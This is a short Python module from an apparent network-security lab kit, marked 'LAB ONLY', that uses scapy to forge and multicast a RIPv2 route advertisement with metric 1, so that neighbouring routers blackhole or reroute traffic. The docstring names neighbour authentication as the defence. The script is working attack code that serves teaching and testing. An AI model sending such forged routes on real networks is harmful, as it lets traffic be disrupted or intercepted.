# SPDX-License-Identifier: MIT
# Copyright (c) 2026 Chris <goabonga@pm.me>

"""Attack side of netlab-routing: inject a RIP route. LAB ONLY.

Multicasts a RIPv2 response advertising a route with a low metric so neighbours
prefer it - blackholing or rerouting the traffic. Neighbour authentication (see
igp.py) rejects the forged update.
"""

from __future__ import annotations

import argparse

from netlab_core import verdict
from netlab_core.sniffing import load_scapy


def run(args: argparse.Namespace) -> int:
    s = load_scapy()
    pkt = (
        s.IP(dst="224.0.0.9")
        / s.UDP(sport=520, dport=520)
        / s.RIP(cmd=2, version=2)
        / s.RIPEntry(AF=2, addr=args.prefix, mask=args.mask, nextHop=args.next_hop, metric=1)
    )
    print(f"[*] injecting RIP route {args.prefix}/{args.mask} -> {args.next_hop}")
    s.send(pkt, count=args.count, verbose=0)
    verdict("ALERT", f"advertised {args.prefix} via {args.next_hop}")
    return 0
